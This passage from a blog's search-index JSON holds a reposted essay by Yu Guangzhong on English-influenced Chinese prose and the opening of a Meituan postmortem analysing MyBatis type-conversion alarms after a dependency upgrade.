的计算","categories":["Java"],"tags":["JDK","Java","15"]},{"title":"余光中：怎样改进英式中文？- 论中文的常态与变态","url":"/repost/2020/improve-chinese/","content":"\n> 本文转载自 [余光中：怎样改进英式中文？- 论中文的常态与变态](https://open.leancloud.cn/improve-chinese/)\n\n自五四新文化运动以来，七十年间，中文的变化极大。一方面，优秀的作家与学者笔下的白话文愈写愈成熟，无论表情达意或是分析事理，都能运用自如。另一方面，地道的中文，包括文言文与民间文学的白话文，和我们的关系日渐生疏，而英文的影响，无论来自直接的学习或是间接的潜移默化，则日渐显著，因此一般人笔下的白话文，西化的病态日渐严重。一般人从大众传媒学到的，不仅是流行的观念，还有那些观念赖以包装的种种说法；有时，那些说法连高明之士也抗拒不了。今日的中文虽因地区不同而互见差异，但共同的趋势都是繁琐与生硬，例如中文本来是说「因此」，现在不少人却爱说「基于这个原因」；本来是说「问题很多」，现在不少人却爱说「有很多问题存在」。对于这种化简为繁、以拙代巧的趋势，有心人如果不及时提出警告，我们的中文势必越变越差，而地道中文原有的那种美德，那种简洁而又灵活的语文生态，也必将面目全非。\n\n中文也有生态吗？当然有。措词简洁、句式灵活、声调铿锵，这些都是中文生命的常态。能顺着这样的生态，就能长保中文的健康。要是处处违拗这样的生态，久而久之，中文就会污染而淤塞，危机日渐迫近。\n\n<!-- more -->\n\n目前中文的一大危机，是西化。我自己出身外文系，三十多岁时有志于中文创新的试验，自问并非语文的保守派。大凡有志于中文创作的人，都不会认为善用四字成语就是创作的能事。反之，写文章而处处仰赖成语，等于只会用古人的脑来想，只会用古人的嘴来说，绝非豪杰之士。但是，再反过来说，写文章而不会使用成语，问题就更大了。写一篇完全不带成语的文章，不见得不可能，但是很不容易；这样的文章要写得好，就更难能可贵。目前的情形是，许多人写中文，已经不会用成语，至少会用的成语有限，显得捉襟见肘。一般香港学生目前只会说「总的来说」，却似乎忘了「总而言之」。同样地，大概也不会说「一言难尽」，只会说「不是一句话就能够说得清楚的」。\n\n成语历千百年而犹存，成为文化的一部分。例如「千锤百炼」，字义对称，平仄协调，如果一定要说成「千炼百锤」，当然也可以，不过听来不顺，不像「千锤百炼」那样含有美学。同样，「朝秦暮楚」、「齐大非偶」、「乐不思蜀」等语之中，都含有中国的历史。成语的衰退正显示文言的淡忘，文化意识的萎缩。\n\n英文没有学好，中文却学坏了，或者可说，带坏了。中文西化，不一定就是毛病。缓慢而适度的西化甚至是难以避免的趋势，高妙的西化更可以截长补短。但是太快太强的西化，破坏了中文的自然生态，就成了恶性西化。这种危机，有心人都应该及时警觉而且努力抵制。在欧洲的语文里面，文法比较单纯的英文恐怕是最近于中文的了。尽管如此，英文与中文仍有许多基本的差异，无法十分融洽。这一点，凡有中英文互译经验的人，想必都能同意。其实，研究翻译就等于研究比较语言学。以下拟就中英文之间的差异，略略分析中文西化之病。\n\n比起中文来，英文不但富于抽象名词，也喜欢用抽象名词。英文可以说「他的收入的减少改变了他的生活方式」，中文这么说，就太西化了。英文用抽象名词「减少」做主词，十分自然。中文的说法是以具体名词，尤其是人，做主词：「他因为收入减少而改变生活方式」，或者「他收入减少，乃改变生活方式」。\n\n中文常用一件事情（一个短句）做主词，英文则常用一个名词（或名词词组）。「横贯公路再度坍方，是今日的头条新闻」，是中文的说法。「横贯公路的再度坍方，是今日的头条新闻」，就是英文语法的流露了。同理，「选购书籍，只好委托你了」是中文语法。「书籍的选购，只好委托你了」却是略带西化。「推行国语，要靠大家努力」是自然的说法。「推行的国语，要靠大家的努力」却嫌冗赘。这种情形也可见于受词。例如「他们杯葛这种风俗的继续」，便是一句可怕的话。无论如何，「杯葛继续」总嫌生硬。如果改成「他们反对保存这种风俗」，就自然多了。\n\n英文好用抽象名词，其结果是软化了动词，也可以说是架空了动词。科学、社会科学与公文的用语，大举侵入了日常生活，逼得许多明确而有力动词渐渐变质，成为面无表情的词组。下面是几个常见的例子：\n\n- apply pressure: press\n- give authorization: permit\n- send a communication: write\n- take appropriate action: act\n\n在前例之中，简洁的单音节动词都变成了含有抽象名词的片词，表面上看来，显得比较堂皇而高级。例如 press 变成了 apply pressure，动作便一分为二，一半驯化为静止的抽象名词 pressure，一半淡化为广泛而笼统的动词 apply。巴仁（Jacques Barzun）与屈林（Lionel Trilling）等学者把这类广泛的动词叫做「弱动词」（weak verb）。他们说：「科学报告不免单调而冷淡，影响之余，现代的文体喜欢把思路分解成一串静止的概念，用介词和通常是被动语气的弱动词连接起来。」\n\n巴仁所谓的弱动词，相当于英国小说家奥韦尔所谓的「文字的义肢」（verbal false limb）。当代的中文也已呈现这种病态，喜欢把简单明了的动词分解成「万能动词＋抽象名词」的片词。目前最流行的万能动词，是「作出」和「进行」，恶势力之大，几乎要吃掉一半的正规动词。请看下面的例子：\n\n- 本校的校友对社会作出了重大的贡献。\n- 昨晚的听众对访问教授作出了十分热烈的反应。\n- 我们对国际贸易的问题已经进行了详细的研究。\n- 心理学家在老鼠的身上进行试验。\n\n不管是直接或间接的影响，这样的语法都是日渐西化的现象，因为中文原有的动词都分解成上述的繁琐词组了。前面的四句话本来可以分别说成\n\n- 本校的校友对社会贡献很大。\n- 昨晚的听众对访问教授反应十分热烈。\n- 我们对国际贸易的问题已经详加研究。\n- 心理学家用老鼠来做试验（或：心理学家用老鼠试验）。\n\n巴仁等学者感概现代英文喜欢化简为繁、化动为静、化具体为抽象、化直接为迂回，到了「名词成灾」（noun-plague）的地步。学问分工日细，各种学科的行话术语，尤其是科学与社会科学的「夹杠」，经过本行使用，外行借用，加上「新闻体」（journalese）的传播，一方面固然使现代英文显得多彩多姿，另一方面却也造成混乱，使日常用语斑驳不堪。英国诗人格雷夫斯（Robert Graves, 1895-1986）在短诗『耕田』（Tilth）里批评这现象说：\n\n> Gone are the sad monosyllabic days\n> When \"agricultural labour\"still was tilth;\n> And \"100% approbation\", praise;\n> And \"pornographic modernism\", filth-\n> And still I stand by tilth and filth and praise.\n\n「名词成灾」的流行病里，灾情最严重的该是所谓「科学至上」（scientism）。在现代的工业社会里，科学早成显贵，科技更是骄子，所以知识分子的口头与笔下，有意无意，总爱用一些「学术化」的抽象名词，好显得客观而精确。有人称之为「伪术语」（pseudo-jargon）。例如：明明是 first step，却要说成 initial phase：明明是 letter，却要说成 communication，都属此类。\n\n中文也是如此。本来可以说「名气」，却凭空造出一个「知名度」来，不说「很有名」，却要迂回作态，貌若高雅，说成「具有很高的知名度」，真是酸腐可笑。另一个伪术语是「可读性」，同样活跃于书评和出版广告。明明可以说「这本传记很动人」，「这本传记引人入胜」，或者干脆说「这本传记很好看」，却要说成「这本传记的可读性颇高」。我不明白这字眼怎么来的，因为这观念在英文里也只用形容词 readable 而不用抽象名词 readability。英文会说：The biography is highly readable，却不说 The biography has high readability。此风在台湾日渐嚣张。在电视上，记者早已在说「昨晚的演奏颇具可听性」。在书评里，也已见过这样的句子：「传统写实作品只要写得好，岂不比一篇急躁的实验小说更具可看性？」\n\n我实在不懂那位书评家以不能说「岂不比一篇……更耐看（更动人）？」同理，「更具前瞻性」难道真比「更有远见」要高雅吗？长此以往，岂不要出现「他讲的这件趣事可笑性很高」一类的怪句？此外，「某某主义」之类抽象名词也使用过度，英美有心人士都主张少用为妙。中国大陆文章很爱说「富于爱国主义的精神」，其实颇有语病。爱国只是单纯的情感，何必学术化为主义？如果爱国也成主义，我们不是也可以说「亲日主义」、「仇美主义」、「怀乡主义」？其次，主义也就是一种精神，不必重复，所以只要说「富于爱国精神」就够了。\n\n名词而分单数与复数，是欧语文的惯例。英文文法的复数变化，比起其它欧洲语文来，单纯得多。请看「玫瑰都很娇小」这句话在英文、法文、德文、西班牙文、意大利文里的各种说法：\n\n- The roses are small.\n- Les roses sont petites.\n- Die Rosen sind klein.\n- Las rosas son chiquitas.\n- Le rose sono piccole.\n\n每句话都是四个字，次序完全一样，都是冠词、名词、动词、形容词。英文句里，只有动词跟着名词变化，其它二字则不分单、复数。德文句里，只有形容词不变。法文、西班牙文、意大利文的三句里，因为做主词的名词是复数，其它的字全跟着变化。\n\n幸而中文的名词没有复数的变化，也不区分性别，否则将不胜其繁琐。旧小说的对话里确有「爷们」、「娘们」、「ㄚ头们」等复数词，但是在叙述的部分，仍用「诸姐妹」、「众ㄚ鬟」。中文要表多数的时候，也会说「民众」、「徒众」、「观众」、「听众」，所以「众」也有点「们」的作用。但是「众」也好，「们」也好，在中文里并非处处需要复数语尾。往往，我们说「文武百官」，不说「官们」，也不说「文官们」、「武官们」。同理「全国的同胞」、「全校的师生」、「所有的顾客」、「一切乘客」当然是复数，不必再画蛇添足，加以标明。不少国人惑于西化的意识，常爱这么添足，于是「人们」取代原有的「人人」、「大家」、「大众」、「众人」、「世人」。「人们」实在是丑陃的西化词，林语堂绝不使用，希望大家也不要使用。电视上也有人说「民众们」、「听众们」、「球员们」，实在累赘。尤其「众、们」并用，已经不通。\n\n中文词不分数量，有时也会陷入困境。例如「一位观众」显然不通，但是「观众之一」却嫌累赘，也欠自然。「一位观者」毕竟不像「一位读者」那么现成，所以，「一位观众来信说……」之类的句子，也只好由它去了。\n\n可是「……之一」的泛滥，却不容忽视。「……之一」虽然是单数，但是背景的意识却是多数。和其它欧洲语文一样，英文也爱说 one of my favorite actresses, one of those who believe……, one of the most active promoters。中文原无「……之一」的句法，现在我们说「观众之一」实在是不得已。至于这样的句子：\n\n- 刘伶是竹林七贤之一。\n- 作为竹林七贤之一的刘伶……\n\n目前已经非常流行。前一句虽然西化，但不算冗赘。后一句却恶性西化的畸婴，不但「作为」二字纯然多余，「之一的」也文白来杂，读来破碎，把主词「刘伶」压在底下，更是扭捏作态。其实，后一句的意思跟前一句完全一样，却把英文的语法 as one of the Seven Worthies of Bamboo Grove, Liu Ling……生吞活剥地搬到中文里来。\n\n所以，与其说「作为竹林七贤之一的刘伶以嗜酒闻名」，何不平平实实地说「刘伶是竹林七贤之一，以嗜酒闻名」？其实前一句也尽有办法不说「之一」。中文本来可以说「刘伶乃竹林七贤之同侪」；「刘伶列于竹林七贤」；「刘伶跻身竹林七贤」；「刘伶是竹林七贤的同人」。\n\n「竹林七贤之一」也好，「文房四宝之一」也好，情况都不严重，因为七和四范围明确，同时逻辑上也不能径说「刘伶是竹林七贤」，「砚乃文房四宝」。目前的不良趋势，是下列这样的句子：\n\n- 红楼梦是中国文学的名著之一。\n- 李广乃汉朝名将之一。\n\n两句之中。「之一」都是蛇足。世间万事万物都有其同俦同类，每次提到其一，都要照顾到其它，也未免太周到了。中国文学名著当然不止一部，汉朝名将当然也不会祇有一人，不加上这死心眼的「之一」，绝对没有人会误会你孤陋寡闻，或者挂一漏万。一旦养成了这种恶习，只怕笔下的句子都要写成「小张是我的好朋友之一」，「我不过是您的平庸的学生之一」，「他的嗜好之一是收集茶壸」了。\n\n「之一」之病到了香港，更变本加厉，成为「其中之一」。在香港的报刊上，早已流行「我是听王家的兄弟其中之一说的」或者「戴维连一直以来都是我最喜欢的导演其中之一」这类怪句。英文复数观念为害中文之深，由此可见。\n\n这就说到「最……之一」的语法来了。英文最喜欢说「他是当代最伟大的思想家之一」，好像真是精确极了，其实未必。「最伟大的」是抬到至高，「之一」却稍加低抑，结果只是抬高，并未真正抬到至高。你并不知道「最伟大的思想家」究竟是几位，四位吗，还是七位，所以弹性颇大。兜了一个大圈子回来，并无多大不同。所以，只要说「他是一个大名人」或「他是赫赫有名的人物」就够了，不必迂而回之，说什么「他是最有名气的人物之一」吧。\n\n在英文里，词性相同的字眼常用 and 来连接：例如 man and wife, you and I, back and forth。但在中文里，类似的场合往往不用连接词，所以只要说「夫妻」、「你我」、「前后」就够了。同样地，一长串同类词在中文里，也任其并列，无须连接：例如「东南西北」、「金木水火土」、「礼乐射御书数」、「柴米油盐酱醋茶」皆是。中国人绝不说「开门七件事，柴、米、油、盐、酱、醋以及茶。」谁要这么说，一定会惹笑。同理，中文只说「思前想后」、「说古道今」。可是近来 and 的意识已经潜入中文，到处作怪。港报上有过这样的句子：\n\n在政治民主化与经济自由化的发展道路，台北显然比北京起步更早及迈步更快，致在政经体制改革的观念、行动、范围及对象，更为深广更具实质……\n\n这样的文笔实在不很畅顺，例如前半句中，当做连接词的「与」、「及」都不必要。\n\n「与」还可以说不必要，「及」简直就要不得。后半句的「更为深广更具实质」才像中文，「起步更早及迈步更快」简直是英文。「及」字破坏了中文生态，因为中文没有这种用法。此地一定要用连接词的话，也只能用「而」，不可用「及」。正如 slow but sure 在中文里该说「慢而可靠」或者「缓慢而有把握」，却不可说「慢及可靠」或者「缓慢与有把握」。「而」之为连接词，不但可表更进一步，例如「学而时习之」，还可表后退或修正，例如「国风好色而不淫，小雅怨诽而不乱」，可谓兼有 and 与 but 之功用。\n\n目前的不良趋势，是原来不用连接词的地方，在 and 意识的教唆下，都装上了连接词；而所谓连接词都由「和」、「与」、「及」、「以及」包办，可是灵活而宛转的「而」、「并」、「而且」等词，几乎要绝迹了。\n\n（※英：但也不要不当而而而！）\n\n介词在英文里的用途远比中文里重要，简直成了英文的润滑剂。英文的不及物动词加上介词，往往变成了及物动词，例如 look after, take in 皆是。介词词组（prepositional phrase）又可当作形容词或助词使用，例如 a friend in need, said it in earnest。所以英文简直离不了介词。中文则不尽然。「扬州十日、嘉定三屠」两个词组不用一个介词，换了英文，非用不可。\n\n「欢迎王教授今天来到我们的中间，在有关环境污染的各种问题上，为我们作一次学术性的演讲。」这样不中不西的开场白，到处可以听见。其实「中间」、「有关」等介词，都是画蛇添足。有一些圣经的中译，牧师的传道，不顾中文的生态，会说成「神在你的里面」。意思懂，却不像中文。\n\n「有关」、「关于」之类，大概是用得最滥的介词了。「有关文革的种种，令人不能置信」；「今天我们讨论有关台湾交通的问题」；「关于他的申请，你看过了没有？」在这句子里，「有关」、「关于」完全多余。最近我担任「全国学生文学奖」评审，有一篇投稿的题目很长，叫「关于一个河堤孩子的成长故事」。十三个字里，「关于」两字毫无作用，「一个」与「故事」也可有可无。\n\n「关于」有几个表兄弟，最出风的是「由于」。这字眼在当代中文里，往往用得不妥：\n\n- 由于秦末天下大乱，（所以）群雄四起。\n- 由于好奇心的驱使，我向窗内看了一眼。\n- 由于他的家境贫穷，使得他只好休学。\n\n英文在形式上重逻辑，喜欢交代事物物的因果关系。中文则不尽然。「清风徐来，水波不兴」，其中当然有因果关系，但是中文只用上下文作不言之喻。换了是英文，恐怕会说「因为清风徐来，所以水波不兴」，或者「清风徐来，而不兴起水波」。上列的第一句，其实删掉「由于」与「所以」，不但无损文意，反而可使文章干净。第二句的「由于好奇心的驱使」并没有什么大毛病（注四），可是有点啰嗦，更犯不着动用「驱使」一类的正式字眼。如果简化为「出于好奇，我向窗内看了一眼」或者「为了好奇，我向窗内看了一眼」，就好多了。第三句的不通，犯者最多。「由于他的家境贫穷」这种词组，只能拿来修饰动词，却不能当做主词。这一句如果删掉「由于」，「使得」一类交代因果的冗词，写成「他家境贫穷，只好休学」，反觉眉清目秀。\n\n英文的副词形式对中文为害尚不显著，但也已经开始了。例如这样的句子：\n\n- 他苦心孤诣地想出一套好办法来。\n- 老师苦口婆心地劝了他半天。\n- 大家苦中作乐地竟然大唱其民谣。\n\n「苦」字开头的三句成语，本来都是动词，套上副词语尾的「地」就降为副词了。这么一来，文章仍然清楚，文法上却主客分明，太讲从属的关系，有点呆板。若把「地」一律删去，代以逗点，不但可以摆脱这主客的关系，语气也会灵活一些。\n\n有时这样的西化副词词组太长，例如「他知其不可为而为之地还是去赴了约」，就更应把「地」删掉，代之以逗点，使句法松松筋骨。目前最滥的副词是「成功地」。有一次我不该为入学试出了这么一个作文题目：〈国父诞辰的感想〉，结果十个考生里至少有六个都说：「国父孙中山先生成功地推翻了满清。」这副词「成功地」在此毫无意义，因为既然推而翻之，就是成功了，何待重复。同理，「成功地发明了相对论」、「成功地泳渡了直布罗陀海峡」也都是饶舌之说。天下万事，凡做到的都要加上「成功地」，岂不累人？\n\n白话文一用到形容词，似乎就离不开「的」，简直无「的」不成句了。在白话文里，这「的」字成了形容词除不掉的尾巴，至少会出现在这些场合：\n\n- 好的，好的，我就来。是的，没问题。\n- 快来看这壮丽的落日！\n- 你的笔干了，先用我的笔吧。\n- 也像西湖的有里外湖一样，丽芒分为大湖小湖两部分。\n- 他当然是别有用心的。你不去是对的。\n\n喜欢用「的」或者无力拒「的」之人，也许还有更多的场合要偏劳这万能「的」字。我说「偏劳」，因为在英文里，形容词常用的语尾有 -tive, -able, -ical, -ous 等多种，不像在中文里全由「的」来担任。英文句子里常常连用几个形容词，但因语尾变化颇大，不会落入今日中文的公式。例如雪莱的句子：\n\n> An old, mad, blind, despised, and dying king,---\n\n一连五个形容词，直译过来，就成了： 一位衰老的、疯狂的、瞎眼的、被人蔑视的、垂死的君王---\n\n一碰到形容词，就不假思索，交给「的」去组织，正是流行的白话文所以僵化的原因。\n\n白话文所以啰嗦而软弱，虚字太多是一大原因，而用得最滥的虚字正是「的」。学会少用「的」字之道，恐怕是白话文作家的第一课吧。其实许多名作家在这方面都很随便，且举数例为证：\n\n> （一）月光是隔了树照过来的，高处丛生的灌木，落下参差的斑驳的黑影，峭楞楞如鬼一般；弯弯的杨柳的稀疏的倩影，却又像是画在荷叶上。\n>\n> （二）最后的鸽群……也许是误认这灰暗的凄冷的天空为夜色的来袭，或是也预感到风雨的将至，遂过早地飞回它们温暖的木舍。\n>\n> （三）白色的鸭也似有一点烦躁了，有不洁的颜色的都市的河沟里传出它们焦急的叫声。\n\n第一句的「参差的斑驳的黑影」和「弯弯的杨柳的稀疏的倩影」，都是单调而生硬的重迭。用这么多「的」，真有必要吗？为什么不能说「参差而斑驳」呢？后面半句的原意本是「弯弯的杨柳投下稀疏的倩影」，却不分层次，连用三个「的」，读者很自然会分成「弯弯的、杨柳的、稀疏的、倩影」。第二句至少可以省掉三个「的」。就是把「灰暗的凄冷的天空」改成「灰暗而凄冷的天空」，再把「夜色的来袭」和「风雨的将至」改成「夜色来袭」、「风雨将至」。前文说过，中文好用短句，英文好用名词，尤其是抽象名词。「夜色来袭」何等有力，「夜色的来袭」就松软下来了。最差的该是第三句了。「白色的鸭」跟「白鸭」有什么不同呢？「有不洁的颜色的都市的河沟」，乱用「的」字，最是惑人。此句原意应是「颜色不洁的都市河沟」（本可简化为）「都市的脏河沟」，但读者同样会念成「有不洁的、颜色的、都市的、河沟」。\n\n目前的形容词又有了新的花样，那便是用学术面貌的抽象名词来打扮。再举数例为证：\n\n- 这是难度很高的技巧。\n- 他不愧为热情型的人。\n- 太专业性的字眼恐怕查不到吧。\n\n「难度很高的」是什么鬼话呢？原意不就是「很难的」吗？同理，「热情型的人」就是「热情的人」；「太专业性的字眼」就是「太专门的字眼」。到抽象名词里去兜了一圈回来，门面像是堂皇了，内容仍是空洞的。\n\n形容词或修饰语（modifier）可以放在名词之前，谓之前饰，也可以跟在名词之后，谓之后饰。法文往往后饰，例如纪德的作品 La Symphonie pastorale 与 Les Nourritures terrestres，形容词都跟在名词之后；若译成英文，例如 The Pastoral Symphony，便是前饰了。中文译为「田园交响乐」，也是前饰。\n\n英文的形容词照例是前饰，例如前引雪莱的诗句，但有时也可以后饰，例如雪莱的另一诗句：One too like thee—tameless, and swift, and proud。至于形容词片或子句，则往往后饰，例如：man of action, I saw a man who looked like your brother。（※英：此例极佳，请注意！）\n\n目前的白话文，不知何故，几乎一律前饰，似乎不懂后饰之道。例如前引的英文句，若用中文来说，一般人会不假思索说成：「我见到一个长得像你兄弟的男人。」却很少人会说：「我见到一个男人，长得像你兄弟。」如果句短，前饰也无所谓。如果句长，前饰就太生硬了。例如下面这句：「我见到一个长得像你兄弟说话也有点像他的陌生男人。」就冗长得尾大不掉了。要是改为后饰，就自然得多：「我见到一个陌生男人，长得像你兄弟，说话也有点像他。」其实文言文的句子往往是后饰的，例如司马迁写项羽与李广的这两句：\n\n> 籍长八尺余，力能扛鼎，才气过人。\n> 广为人长，猿臂，其善射亦天性也。\n\n这两句在当代白话文里，很可能变成：\n\n- 项籍是一个身高八尺，力能扛鼎，同时才气过人的汉子。\n- 李广是一个高个子，手臂长得好像猿臂，天性就会射箭的人。\n\n后饰句可以一路加下去，虽长而不失自然，富于弹性。前饰句以名词压底，一长了，就显得累赘，紧张，不胜负担。所以前饰句是关闭句，后饰句是开放句。\n\n动词是英文文法的是非之地，多少纠纷，都是动词惹出来的。英文时态的变化，比起其它欧洲语文来，毕竟单纯得多。若是西班牙文，一个动词就会变出七十八种时态。\n\n中文的名词不分单复与阴阳，动词也不变时态，不知省了多少麻烦。（阿房宫赋）的句子：「秦人不暇自哀，而后人哀之。后人哀之而不鉴之，亦使后人而复哀后人也。」就这么一个「哀」字，若用西文来说，真不知要玩出多少花样来。\n\n中文本无时态变化，所以在这方面幸而免于西化。中国文化这么精妙，中文当然不会拙于分别时间之先后。散文里说：「人之将死，其言也善」；「议论未定，而兵已渡河。」诗里说：「已凉天气未寒时」。这里面的时态够清楚的了。苏轼的七绝：「荷尽已无擎雨盖，菊残犹有傲霜枝。一年好景君须记，最是橙黄橘绿时。」面的时序，有已逝，有将逝，更有正在发生，区别得准确而精细。\n\n中文的动词既然不便西化，一般人最多也只能写出「我们将要开始比赛了」之类的句子，问题并不严重。动词西化的危机另有两端：一是单纯动词分解为「弱动词＋抽象名词」的复合动词，前文已经说过。不说「一架客机失事，死了九十八人」，却说「一架客机失事，造成九十八人死亡」，实在是迂回作态。\n\n另一端是采用被动词语气。凡是及物动词，莫不发于施者而及于受者。所以用及物动词叙述一件事，不出下列三种方式：\n\n- 哥伦布发现了新大陆。\n- 新大陆被哥伦布发现了。\n- 新大陆被发现了。\n\n第一句施者做主词，乃主动语气。第二句受者做主词，乃被动语气。第三句仍是受者做主词，仍是被动，却不见施者。这三种句子在英文里都很普遍，但在中文里却以第一种最常见，第二、第三种就少得多。第三种在中文里常变成主动语气，例如「糖都吃光了」，「戏看完了」，「稿写了一半」，「钱已经用了」。\n\n目前西化的趋势，是在原来可以用主动语气的场合改用被动语气。请看下列的例句：\n\n- 我不会被你这句话吓倒。\n- 他被怀疑偷东西。\n- 他这意见不被人们接受。\n- 他被升为营长。\n- 他不被准许入学。\n\n这些话都失之生硬，违反了中文的生态。其实，我们尽可还原为主动语气如下：\n\n- 你这句话吓不倒我。\n- 他有偷东西的嫌疑。\n- 他这意见大家都不接受。\n- 他升为营长。\n- 他未获准入学。\n\n同样，「他被选为议长」不如「他当选为议长」。「他被指出许多错误」也不如「有人指出他许多错误」。「他常被询及该案的真相」也不如「常有人问起他该案的真相」。\n\n目前中文的被动语气有两个毛病。一个是用生硬的被动语气来取代自然的主动语气。另一个是千篇一律只会用「被」字，似乎因为它发音近于英文的 by，却不解从「受难」到「遇害」，从「挨打」到「遭殃」，从「经人指点」到「为世所重」，可用的字还有许多，不必套一个公式。\n\n中文的西化有重有轻，有暗有明，但其范围愈益扩大，其现象愈益昭彰，颇有加速之势。以上仅就名词、连接词、介词、副词、形容词、动词等西化之病稍加分析，希望读者能举一反三，知所防范。\n\n常有乐观的人士说，语言是活的，有如河流，不能阻其前进，所谓西化乃必然趋势。语言诚然是活的，但应该活得健康，不应带病延年。至于河流的比喻，也不能忘了两岸，否则泛滥也会成灾。西化的趋势当然也无可避免，但不宜太快、太甚，应该截长补短，而非以短害长。\n\n颇有前卫作家不以杞人之忧为然，认为坚持中文的常规，会妨碍作家的创新。这句话我十分同情，因为我也是「过来人」了。「语法岂为我辈而设哉！」诗人本有越界的自由。我在本文强调中文的生态，原为一般写作说法，无意规范文学的创作。前卫作家大可放心去追逐缪思，不用碍手碍脚，作语法之奴。\n\n不过有一点不可不知。中文发展了好几千年，从清通到高妙，自有千锤百炼的一套常态。谁要是不知常态为何物而贸然自诩为求变，其结果也许只是献拙，而非生巧。变化之妙，要有常态衬托才显得出来。一旦常态不存，余下的只是乱，不是变了。","categories":["转载"],"tags":["文案风格","写作规范","格式规范","英式中文","余光中"]},{"title":"MyBatis版本升级引发的线上告警回顾及原理分析","url":"/repost/2020/inf-bom-mybatis/","content":"\n## 背景\n\n某天晚上，美团到店事业群某项系统服务正在进行常规需求的上线。因为在内部的Plus系统发布时，提示inf-bom版本需要升级，于是我们就将inf-bom版本从1.3.9.6 升级至1.4.2.1，如下图1所示：\n\n![图1 版本升级](https://up-img.yonghong.tech/pic/2020/06/21-00-25-6e8a4a27586831fe9ee04855c2bd69ff150501-kgRRpZ.png)\n\n图1 版本升级\n\n\n不过，当服务上线后，开始陆续出现了一些更新系统交互日志方面的报警，这属于系统的辅助流程，报警如下方代码所示。我们发现都是跟MyBatis相关的报警，说明在进行类型转换的时候，系统产生了强转错误。\n\n{% raw %}\n\n```json\n更新开票请求返回日志, id:{#######}, response:{{\"code\":XXX,\"data\":{\"callType\":3,\"code\":XXX,\"msg\":\"XXXX\",\"shopId\":XXXXX,\"taxPlateDockType\":\"XXXXXXX\"},\"msg\":\"XXXXX\",\"success\":XXXX}}\nnested execption is org.apache.ibatis.type.TypeException: Could not set parameters for mapping: ParameterMapping{property='updateTime', mode=IN, javaType=class java.lang.String,\njdbcTyp=null,resultMapId='null',jdbcTypeName='null',expression='null'}.Cause org.apache.ibatis.type.TypeException,Error setting non null parameter #2 with JdbcType null. Try setting a\ndifferent Jdbc Type for this parameter or a different configuration property.Cause java.lang.ClassCastException:java.time.LocalDateTime cannot be cast to java.lang.String\n```\n\n{% endraw %}\n\n因为报警这一块代码，属于历史功能，如果失败并不会影响主流程。但在定位期间，如果频繁报警的话，就会造成一定的干扰。因此，我们马上采取了回滚操作，将inf-bom的版本回滚至历史版本，直至报警消失，然后再进行问题的定位和分析。以下章节就是我们对报警原因的定位及原因详细分析的介绍，希望这些思路能够对大家有所启发和帮助。\n\n<!--more-->\n\n## 报警原因定位\n\n在回滚完毕后，我们开始具体分析报警产生的主要原因，于是进行了以下几步的排查。\n\n第一步，查看了报警的Mapper方法，如下代码段所示。这个是接收返回参数，根据主键id，更新具体响应内容和时间的代码，入参有3个，类型分别为long、String和LocalDateTime。\n\n```\nint updateResponse(@Param(\"id\")long id, @Param(\"response\")String response, @Param(\"updateTime\")LocalDateTime updateTime);\n```\n\n第二步，我们查看了Mapper方法对应的XML文件，如下代码段所示，对应的parameterType类型是String，而实际参数的类型包括long、String以及LocalDateTime。\n\n```\n<update id=\"updateResponse\" parameterType=\"java.lang.String\">\nUPDATE invoice_log\n  SET response = #{response}, update_time = #{updateTime}\nWHERE id = #{id}\n</update>\n```\n\n第三步，我们查看了MyBatis上线前后的版本，报警的内容是：MyBatis在处理SQL语句时，发现不能将LocalDateTime转型为String，这一段逻辑在上线前是可以正常运行的，并且上线的业务逻辑对这段历史代码无改动。因此，我们猜测是因为inf-bom的升级，从而导致MyBatis的版本发生了变化，对某些历史功能不再支持了。MyBatis版本上线前后的变化如下表所示：\n\n![表1 MyBatis版本升级前后对比](https://up-img.yonghong.tech/pic/2020/06/21-00-25-9e99c9850481a74c53f7c795d3dcc7bb23662-yaBNTv.png)\n\n表1 MyBatis版本升级前后对比\n\n\n\n第四步，我们通过第三步可以得到，在这次inf-bom的版本升级中，MyBatis的版本直接升了两个大版本，因此我们可以基本将原因猜测为MyBatis升级跨度较大，导致部分历史功能没有兼容支持，从而引起线上SQL的更新报错。\n\n第五步，为了具体验证第四步的想法，我们通过UT的方式，将MyBatis的版本不断从3.4.6往下降，直至没有报错的位置。最终的定位是：当MyBatis版本为3.2.3时，线上代码是正常可用的，但只要升一个版本，也就是自3.2.4开始，就开始不兼容目前的用法。不过，我们当时的思路并不是很好，应该从小版本逐个往上升或者使用二分法，可以加速定位版本的效率。\n\n最后，我们定位到了产生报警的根本问题。总的来说，MyBatis版本由inf-bom引入而来，inf-bom从3.2.3 升级到了3.4.6版本，而MyBatis自3.2.4开始就不支持目前系统内的SQL Mapper的用法，因此在升级后，线上就出现了频繁报警的问题。\n\n问题已经定位，但是还有很多事情我们需要弄清楚。为什么版本升级后就不兼容历史的用法？具体是哪一块内容不兼容？背后的原理又是什么？下文，我们会详细进行分析。\n\n## 详细分析\n\n### MyBatis升级3.2.4版本的官方Release公告\n\n首先，从报错的原因上来看，请注意这句话：“Caused by: java.lang.ClassCastException: java.lang.LocalDateTime cannot be cast to java.lang.String.”MyBatis在构建SQL语句时，发现时间字段类型LocalDateTime不能强制转为String类型。而这个SQL对应的XML配置在3.2.3的版本是可以正常使用的，那么我们先从MyBatis的Release Log上查看3.2.4版本到底发生了什么变化。\n\n> An special remark about this feature. Previous versions ignored the “parameterType” attribute and used the actual parameter to calculate bindings. This version builds the binding information during startup and the “parameterType” attribute is used if present (though it is still optional), so in case you had a wrong value for it you will have to change it.\n\n从官网的Release Log可以看到，MyBatis在3.2.4以前的版本，会忽略XML中的parameterType这个属性，并且使用真实的变量类型进行值的处理。但在3.2.4及以后的版本中，这个属性就被启用了，如果出现类型不匹配的话，就会出现转型失败的报错。这也提示我们开发者，在升级版本时，需要检查系统内的XML配置，使类型进行匹配，或者不设置该属性，让MyBatis自行进行计算。\n\n根据以上内容，我们可以了解到，在版本升级后，MyBatis在构建SQL语句，在获取字段值时的逻辑发生了变化。接下来我们将通过一个简单的示例，来了解一下MyBatis在获取字段值这一块的具体代码流程是怎样的，以3.2.3版本为例。\n\n### 以版本3.2.3为例，MyBatis构建SQL语句过程的原理分析\n\n我们看一下配置，首先定义一个通过主键id获取学生信息的方法，仿造系统内的历史代码，我们将parameterType定义为java.lang.String，这和方法对应的参数int并不相同。\n\n```\npublic StudentEntity getStudentById(@Param(\"id\") int id);\n<select id=\"getStudentById\" parameterType=\"java.lang.String\" resultType=\"entity.StudentEntity\">\nSELECT id,name,age FROM student WHERE id = #{id}\n</select>\n```\n\nMyBatis框架要做的事情，就是在运行getStudentById(2)的时候，将 #{id}进行替换，使SQL语句变成SELECT id,name,age FROM student WHERE id = 